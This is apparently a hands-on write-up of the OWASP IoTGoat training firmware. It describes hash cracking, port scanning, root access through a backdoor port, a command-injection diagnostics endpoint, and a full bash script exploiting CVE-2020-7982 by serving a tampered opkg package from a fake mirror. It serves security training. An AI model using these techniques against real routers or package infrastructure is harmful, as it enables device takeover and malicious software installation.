# IoTGoat - Firmware

You can download the firmware from the official OWASP release:

🔗 [Download IoTGoat Firmware (v1.0)](https://github.com/OWASP/IoTGoat/releases/download/v1.0/IoTGoat-x86.img.gz)

- After downloading the firmware , **extract** the `.img` file . 
- Then use **binwalk** to view/extract the file system embedded in the firmware.

```
$ binwalk IoTGoat-x86.img

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
262144        0x40000         Linux EXT filesystem, blocks count: 4096, image size: 4194304, rev 2.0, ext2 filesystem data, UUID=57f8f4bc-abf4-655f-bf67-946fc0f9c0f9
5325930       0x51446A        xz compressed data
17301504      0x1080000       Squashfs filesystem, little endian, version 4.0, compression:xz, size: 3481630 bytes, 1352 inodes, blocksize: 262144 bytes
```
- Here **Squashfs Filesystem** is the type of compressed file system , used for read-only file-system. This is where the linux files are been held.

---

> Hardcoded Password

- Then you find some hardcoded passwds in /etc/shadow of the squashfs-root. This passwds can be cracked using some tools called `John The Ripper` and `HashCat`.

- I used some commonly used wordlist called mirabot-net. And cracked the passwd for **iotgoatuser**.

- For the root, it didn't work. I used rockyou.txt which also failed. So I tried to make a custom wordlist using some tools called crunch but it didn't as per my thought. So I am searching for some another ways to crack the password.

---
> Legacy network services listening upon start up

- This one is basically using nmap to search for open port in the router's ip.

- I got multiple services, for example:- http server , ssh and also telnetd which asks credentials when connected through nc.

---

> Persistent backdoor daemon configured to run during start up

- I found the backdoor when scanned the ip for open ports.I used nmap to scan for open ports. Some open ports were http,https which shows it is running some web.

- I used used a GUI tool of namp called zenmap in kali linux which hand in-built nmap option where i choose to scan all tcp port. This scan resulted in showing a tcp as backdoor.

- When I tried to connect to it through nc, i got the access as root. I also tried to create a file which was successful.

---

> A "secret" developer diagnostics page not directly accessible and exposes shell access to users

- When you look at the url of the web page , you can see the path of the file (i.e) */www/cgi-bin/luci* which is like a entry-point. By examining it and got to found out that it the code just gets and information and instruction from */usr/lib/lua/luci* (backend).

- Then I checked the controller directory and discovered the IoTGoat backend code for the camera and door modules, as well as a hidden command injection endpoint — **a secret developer diagnostics page**.

- Also it had a command to send through url (i.e) webcmd. I can send cmd through it for example, webcmd?cmd=ls will return me the output.

---

> Insufficient Privacy Protection

- I found out many leaked data using firmwalker which is a automated script to find the binarys, db files and more.

- It showed me many db files and keys for multiple apps. One db was in */usr/lib/lua/luci/controller/iotgoat/sensordata.db* which had email and their birthday dates.

---

> Lack of Device Management

- In the web application, only the kernal logs are avaiable in system. the Openwrt logs are not enabled.

---

> Insecure package update configuration defaults including CVE-2020-7982.

- opkg reads the SHA256sum field but the value has a leading space.The function checksum_hex2bin() tries to skip the space, but by mistake, it still uses the untrimmed version for decoding.This causes the decoding to fail silently, so no checksum gets stored.Later, the checksum check is skipped, allowing tampered packages to be installed without warning.

- So to exploit this **CVE-2020-7982** , we need the patch our own binary with a packages(download from [https://download.openwrt.org](https://download.openwrt.org)).

- We can find the architecture of the file which the opkg download from the server using `opkg print-architecture`.

- After finding the architecture, we can write a script to host a server to mimic the server from which opkg fetch the files and checks its intergity(actually it fails here).

```
#!/bin/bash
set -e
rm -rf downloads.openwrt.org/ attr_20170915-1_i386_pentium4.ipk releases/

wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/base/Packages.gz || true
wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/base/Packages.sig || true
wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/luci/Packages.gz || true
wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/luci/Packages.sig || true
wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/packages/Packages.gz || true
wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/packages/Packages.sig || true
wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/routing/Packages.gz || true
wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/routing/Packages.sig || true
wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/telephony/Packages.gz || true
wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/telephony/Packages.sig || true
wget -x http://downloads.openwrt.org/releases/18.06.2/targets/x86/generic/packages/Packages.gz || true
wget -x http://downloads.openwrt.org/releases/18.06.2/targets/x86/generic/packages/Packages.sig || true

mv downloads.openwrt.org/releases .
rm -rf downloads.openwrt.org/

wget https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/packages/attr_20170915-1_i386_pentium4.ipk
ORIGINAL_FILESIZE=$(stat -c%s "attr_20170915-1_i386_pentium4.ipk")
tar zxf attr_20170915-1_i386_pentium4.ipk
rm attr_20170915-1_i386_pentium4.ipk
mkdir data/
cd data/
tar zxvf ../data.tar.gz
rm ../data.tar.gz
rm -f /tmp/pwned.asm /tmp/pwned.o
echo "section .text" >>/tmp/pwned.asm
echo "global _start" >>/tmp/pwned.asm
echo "_start:" >>/tmp/pwned.asm
echo " mov edx,len" >>/tmp/pwned.asm
echo " mov ecx,msg" >>/tmp/pwned.asm
echo " mov ebx,1" >>/tmp/pwned.asm
echo " mov eax,4" >>/tmp/pwned.asm
echo " int 0x80" >>/tmp/pwned.asm
echo " mov eax,1" >>/tmp/pwned.asm
echo " int 0x80" >>/tmp/pwned.asm
echo "section .data" >>/tmp/pwned.asm
echo "msg db 'Nice Ch3ck',0xa" >>/tmp/pwned.asm
echo "len equ $ - msg" >>/tmp/pwned.asm
nasm -f elf32 /tmp/pwned.asm -o /tmp/pwned.o
ld -m elf_i386 /tmp/pwned.o -o usr/bin/attr
tar czvf ../data.tar.gz *
cd ../
rm -rf data/
tar czvf attr_20170915-1_i386_pentium4.ipk control.tar.gz data.tar.gz debian-binary
rm control.tar.gz data.tar.gz debian-binary
MODIFIED_FILESIZE=$(stat -c%s "attr_20170915-1_i386_pentium4.ipk")
FILESIZE_DELTA="$(($ORIGINAL_FILESIZE-$MODIFIED_FILESIZE))"
if [ $FILESIZE_DELTA -gt 0 ]; then
  head -c $FILESIZE_DELTA </dev/zero >>attr_20170915-1_i386_pentium4.ipk
fi
wget https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/packages/libattr_20170915-1_i386_pentium4.ipk
mkdir -p releases/18.06.2/packages/i386_pentium4/packages/
mv attr_20170915-1_i386_pentium4.ipk releases/18.06.2/packages/i386_pentium4/packages/
mv libattr_20170915-1_i386_pentium4.ipk releases/18.06.2/packages/i386_pentium4/packages/
sudo python3 -m http.server 80 --bind 0.0.0.0
```

- Above script, sets up a server and mimics as package server. But we should also configue the */etc/host* with our hosting ip. This only works when the opkg searchs for the package in the script's ip. There is also a another way to do without interacting or changes things in firmware, it is called DNS spoofing , which just redirects the request to our package server.

- Then run **opkg update && opkg install attr** which configures the attr perfectly without any warning.

- If we run attr, it displays *Nice Ch3ck*.

		

